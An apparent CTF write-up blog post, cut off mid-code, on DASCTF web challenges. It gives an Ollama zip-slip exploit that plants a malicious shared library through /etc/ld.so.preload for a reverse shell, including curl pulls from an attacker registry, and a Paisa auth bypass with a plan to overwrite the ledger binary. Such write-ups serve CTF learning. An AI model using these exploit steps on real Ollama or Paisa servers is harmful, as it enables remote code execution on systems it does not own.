<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/favicon.ico">
  
  <title>dasctf十月web方向部分题解 | Err0r233</title>
  <meta name="author" content="Err0r2333" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="Web" />
  
  <meta name="description" content="被ld.so.preload气晕。">
<meta property="og:type" content="article">
<meta property="og:title" content="dasctf十月web方向部分题解">
<meta property="og:url" content="http://example.com/posts/49264.html">
<meta property="og:site_name" content="Err0r233">
<meta property="og:description" content="被ld.so.preload气晕。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/favicon.ico">
<meta property="article:published_time" content="2024-10-24T09:21:25.000Z">
<meta property="article:modified_time" content="2024-10-26T15:10:11.612Z">
<meta property="article:author" content="Err0r2333">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/favicon.ico">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner3.png');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/bizhiaaaaa.png');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
</head>



    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                        
                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
                                        
                                    
                                        
                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
                                        
                                    
                                        
                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
                                        
                                    
                                        
                                            <li>
                                                <a><i class="fa fa-link"></i>链接</a>
                                                <ul class="sub-menu">
                                                    
                                                        
                                                    
                                                </ul>
                                            </li>
                                        
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">Err0r233</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>Err0r233</h2> <br />
                        <span>Err0r233的个人博客</span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/49264.html">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">dasctf十月web方向部分题解</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-10-24T09:21:25.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-10-24</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~26.19K
                    
                    字
                </li>
                
                    <li id="/posts/49264.html" class="leancloud_visitors" data-flag-title="dasctf十月web方向部分题解">
                        <i class="fa fa-eye"></i>
                        <span class="leancloud-visitors-count"> </span> 次阅读
                    </li>
                    
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1729955411612"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><p>被ld.so.preload气晕。</p>
<span id="more"></span>
<h1><span id="ollama4shell"> ollama4shell</span></h1>
<p>评价为最有遗憾的题目，就是差那个so就写出来了，真恶心啊。</p>
<p>ollama 0.1.34之前存在一个<code>cve-2024-37032</code>，但是题目给的ollama版本是<code>1.4.0</code>已经修复了，只能够另寻它路</p>
<p>发现了一个新版的任意文件写入：</p>
<p><a target="_blank" rel="noopener" href="https://vuldb.com/zh/?id.276057">https://vuldb.com/zh/?id.276057</a></p>
<p>这个是通过<code>zip-slip</code>漏洞从而将文件任意写入的洞，目前exp：</p>
<p>用这个exp可以直接写入。</p>
<p>关键是任意文件写之后我们要怎么操作呢？？</p>
<p>在<code>cve-2024-37032</code>的利用中已经提到了这一点：</p>
<p><a target="_blank" rel="noopener" href="https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032#the-vulnerability-arbitrary-file-write-via-path-traversal-25">https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032#the-vulnerability-arbitrary-file-write-via-path-traversal-25</a></p>
<blockquote>
<h2><span id="finally-remote-code-execution"> Finally, Remote Code Execution</span></h2>
<p>As we mentioned previously, it is possible to exploit the Arbitrary File Write vulnerability to corrupt certain files in the system. In Docker installations, it is pretty straightforward to exploit it and achieve <a target="_blank" rel="noopener" href="https://www.wiz.io/academy/remote-code-execution-rce-attack">Remote Code Execution</a>, as the server runs with<code>*root*</code> privileges.</p>
<p>The simplest way we thought of achieving remote-code-execution would be to corrupt <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man8/ld.so.8.html"><code>ld.so</code></a><code> </code>configuration files, specifically <code>/etc/ld.so.preload</code>. This file contains a whitespace -separated list of shared libraries that should be loaded whenever a new process starts. Using our Arbitrary File Write exploit-primitive, we plant our payload as a shared library on the filesystem (<code>/root/bad.so</code>) and then we corrupt <code>etc/ld.so.preload</code> to include it. Finally, we query the <code>/api/chat</code> endpoint on the Ollama API Server, which subsequently creates a new process and thus loads our payload!</p>
</blockquote>
<p>简单地说就是利用<code>/etc/ld.so.preload</code>+任意so即可。当写入成功后需要调用<code>/api/chat</code>从而开出一个新进程触发<code>ld.so.preload</code></p>
<p>这里<code>ld.so.preload</code>的内容就是你恶意so的路径，但是使用<code>ld.so.preload</code>会使得每次都会开一个新进程，导致直接被卡死(本地vps上试过，本地环境也试过)，导致反弹不了shell。就是差这最后一步，必须要删除<code>/etc/ld.so.preload</code>才能够正常。</p>
<p>解决的方式就是在编写的c里面加上这一删除的过程：</p>
<img src="/posts/49264/1.png" class title="awa">
<p>编译成so：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC 1.c -o 1.so</span><br></pre></td></tr></table></figure>
<p>制作zip-slip的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;D:\\lost and found\\CTF\\dasctf202410\\poc.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;/poc.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;D:\\lost and found\\CTF\\dasctf202410\\1.so&quot;</span>, <span class="string">&quot;../../../../../../../root/1.so&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>
<p>之后流程跟<a target="_blank" rel="noopener" href="https://gist.github.com/trganda/2affa7162a03a30a79c3f11ef09436ad">exp</a>来就可以了，此处需要写入两次，第一次写入<code>1.so</code>，第二次写入<code>/etc/ld.so.preload</code></p>
<p>linux虚拟机内的<code>sha256sum</code>命令能够快速算出我们生成的zip包的sha256值，之后只需修改</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;model_format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gguf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;model_family&quot;</span><span class="punctuation">:</span> <span class="string">&quot;poc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;model_families&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;poc&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;model_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7.6B&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Q4_0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;architecture&quot;</span><span class="punctuation">:</span> <span class="string">&quot;amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rootfs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;layers&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;diff_ids&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;sha256:0c4d18c5ef95682c998d48a73f84a9e3c15ab57db428fc1e85b12290ce5ff7b5&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;sha256:5a6f2f745e489dd4dddee2369becf80a307b9ca8cc69b8dce730f5a574560c16&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>最后一条sha256的值和这个文件的sha256值即可</p>
<p>latest文件也需要更新：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;schemaVersion&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mediaType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sha256:aa1a537b33ec6e2b5fd9b7e437228c9df7103c64868c5a7c19e095f8d33163a0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mediaType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/vnd.docker.container.image.v1+json&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">455</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;layers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sha256:5a6f2f745e489dd4dddee2369becf80a307b9ca8cc69b8dce730f5a574560c16&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;mediaType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/vnd.ollama.image.template&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">545</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>只需修改最下面的sha256值即可，为了方便我vps里起了两个相似的文件夹，另一个写入<code>/etc/ld.so.preload</code>的不用动</p>
<p>保证文件夹符合exp内的<code>tree</code>格式即可</p>
<img src="/posts/49264/2.png" class title="awa">
<p>接下来请求<code>/api</code>即可，注意对http请求要添加<code>Insecure:true</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4. Send a /api/pull request with the malicious server parameter, this will download the evil blobs file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl http://localhost:11434/api/pull -d &#x27;&#123;</span><br><span class="line">  &quot;name&quot;: &quot;tea.trganda.top:2083/trganda/poc:latest&quot;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5. Send a `/api/create` request to ollama</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl http://localhost:11434/api/create -d &#x27;&#123;</span><br><span class="line">  &quot;name&quot;: &quot;poc&quot;,</span><br><span class="line">  &quot;modelfile&quot;: &quot;from @sha256:d40ad46a9b249e3eab803090ec2a51d46405a0afcbfe2a0f1ada7ac3a810f7f9&quot;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6. The /tmp/evil.txt file was successfully created in container</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/posts/49264/3.png" class title="awa">
<p>此时再申请create安装，sha256更改为恶意zip的sha256</p>
<img src="/posts/49264/4.png" class title="awa">
<p>此时已经安装成功，本地查看：</p>
<img src="/posts/49264/5.png" class title="awa">
<p>估计重施安装<code>/etc/ld.so.preload</code>即可，之后需要去<code>/api/chat</code>触发新进程，官方api里是这么调用<code>/api/chat</code>的：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:11434/api/chat -d &#x27;&#123;</span><br><span class="line">  &quot;model&quot;: &quot;mistral&quot;,</span><br><span class="line">  &quot;messages&quot;: [</span><br><span class="line">    &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;why is the sky blue?&quot; &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
<p>这里需要一个model，我们还需要去安装一个model下来，官方api内提供了一个占用很小的model——<code>all-minilm</code>，这个甚至在100M以内，所以我们能够很快地把他pull下来：</p>
<img src="/posts/49264/6.png" class title="awa">
<img src="/posts/49264/7.png" class title="awa">
<p>但是这里报了个错</p>
<img src="/posts/49264/8.png" class title="awa">
<p>是的，这个模型不支持chat，那要怎么办呢</p>
<img src="/posts/49264/9.png" class title="awa">
<p>看官方api的演示，这里有个generate，说不定能靠此生成进程：</p>
<img src="/posts/49264/11.png" class title="awa">
<p>答案是可以的，这样shell就弹过来了，妈妈生的。</p>
<img src="/posts/49264/10.png" class title="awa">
<p>远程环境再复现一遍即可</p>
<img src="/posts/49264/12.png" class title="awa">
<p>真的是被气死了，操他妈的</p>
<h1><span id="paisa4shell"> paisa4shell</span></h1>
<p>这题没做，看看思路。</p>
<p>题目提示：</p>
<blockquote>
<p>前台RCE，题目使用官方docker镜像；flag请提交DASCTF{}里的内容；<a target="_blank" rel="noopener" href="https://github.com/ananthakumaran/paisa">https://github.com/ananthakumaran/paisa</a></p>
<p>鉴权能绕、文件覆盖</p>
</blockquote>
<p>首先是绕鉴权，一般都是<code>/api</code>，直接访问<code>/api</code>会报<code>Invalid token</code>，我们搜索这个错误：</p>
<img src="/posts/49264/13.png" class title="awa">
<p>可以看到它是这样判断的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">return func(c *gin.Context) &#123;</span><br><span class="line">		userAccounts := config.GetConfig().UserAccounts</span><br><span class="line">		if len(userAccounts) == 0 || !strings.HasPrefix(c.Request.RequestURI, &quot;/api&quot;) &#123;</span><br><span class="line">			c.Next()</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>那这个<code>c.Request.RequestURI</code>是啥呢，问问ai：</p>
<img src="/posts/49264/14.png" class title="awa">
<p>可以得到关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用于获取原始的请求URI</span><br></pre></td></tr></table></figure>
<p>此时如果我们将<code>/api</code>url编码的话，获取到的URI就是<code>/%61pi</code>，而不是<code>/api</code>，自然就绕过了鉴权。在<code>server.go</code>文件内有很多api接口，可以测试一下：</p>
<img src="/posts/49264/15.png" class title="awa">
<img src="/posts/49264/16.png" class title="awa">
<p>可以看到确实是可以的，那前台rce又怎么来的呢，<code>前台RCE+文件覆盖</code></p>
<p>联想到rce，我们先在文件里面搜一下有没有内置的<code>exec</code>：</p>
<img src="/posts/49264/17.png" class title="awa">
<p>锁定<code>ledger.go</code>并且查看：</p>
<img src="/posts/49264/18.png" class title="awa">
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(LedgerCLI)</span></span> ValidateFile(journalPath <span class="type">string</span>) ([]LedgerFileError, <span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	errors := []LedgerFileError&#123;&#125;</span><br><span class="line"></span><br><span class="line">	ledgerPath, err := binary.LedgerBinaryPath()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> errors, <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> output, <span class="type">error</span> bytes.Buffer</span><br><span class="line">	args := []<span class="type">string</span>&#123;<span class="string">&quot;--args-only&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">if</span> config.GetConfig().Strict == config.Yes &#123;</span><br><span class="line">		args = <span class="built_in">append</span>(args, <span class="string">&quot;--pedantic&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	args = <span class="built_in">append</span>(args, <span class="string">&quot;-f&quot;</span>, journalPath, <span class="string">&quot;balance&quot;</span>)</span><br><span class="line">	err = utils.Exec(ledgerPath, &amp;output, &amp;<span class="type">error</span>, args...)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> errors, utils.Dos2Unix(output.String()), <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	re := regexp.MustCompile(<span class="string">`(?m)While parsing file &quot;[^&quot;]+&quot;, line ([0-9]+):\s*\n(?:(?:While|&gt;).*\n)*((?:.*\n)*?Error: .*\n)`</span>)</span><br><span class="line"></span><br><span class="line">	matches := re.FindAllStringSubmatch(utils.Dos2Unix(<span class="type">error</span>.String()), <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, match := <span class="keyword">range</span> matches &#123;</span><br><span class="line">		line, _ := strconv.ParseUint(match[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line">		errors = <span class="built_in">append</span>(errors, LedgerFileError&#123;LineFrom: line, LineTo: line, Message: match[<span class="number">2</span>]&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> errors, <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里执行了<code>err = utils.Exec(ledgerPath, &amp;output, &amp;error, args...)</code></p>
<p>相当于把这个ledge文件执行了，我们往ledge里面写内容不就可以了吗</p>
<img src="/posts/49264/19.png" class title="awa">
<p>可以看到<code>ledge</code>应该放在了<code>/usr/bin</code>里，名字叫<code>ledger</code></p>
<p>覆盖这个即可，知道写什么了，那怎么调用这个函数执行呢？</p>
<p>搜索<code>ValidateFile()</code>函数，看和api有没有联系：</p>
<img src="/posts/49264/20.png" class title="awa">
<p>可以看到<code>/api/editor/validate</code>调用了它</p>
<p>问题迎刃而解，现在只剩下要怎么覆盖的问题了，看看api里有没有覆写的api吧：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.POST(<span class="string">&quot;/api/editor/save&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> config.GetConfig().Readonly &#123;</span><br><span class="line">			c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;errors&quot;</span>: []ledger.LedgerFileError&#123;&#125;, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Readonly mode&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> ledgerFile LedgerFile</span><br><span class="line">		<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;ledgerFile); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		c.JSON(<span class="number">200</span>, SaveFile(db, ledgerFile))</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>
<p>这个保存文件的api比较可疑：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SaveFile</span><span class="params">(db *gorm.DB, file LedgerFile)</span></span> gin.H &#123;</span><br><span class="line">	errors, _, err := validateFile(file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Validation failed&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	path := config.GetJournalPath()</span><br><span class="line">	dir := filepath.Dir(path)</span><br><span class="line"></span><br><span class="line">	filePath := filepath.Join(dir, file.Name)</span><br><span class="line">	backupPath := filepath.Join(dir, file.Name+<span class="string">&quot;.backup.&quot;</span>+time.Now().Format(<span class="string">&quot;2006-01-02-15-04-05.000&quot;</span>))</span><br><span class="line"></span><br><span class="line">	err = os.MkdirAll(filepath.Dir(filePath), <span class="number">0700</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Warn(err)</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to create directory&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fileStat, err := os.Stat(filePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; file.Operation != <span class="string">&quot;overwrite&quot;</span> &amp;&amp; file.Operation != <span class="string">&quot;create&quot;</span> &#123;</span><br><span class="line">		log.Warn(err)</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File does not exist&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> perm os.FileMode = <span class="number">0644</span></span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> file.Operation == <span class="string">&quot;create&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span 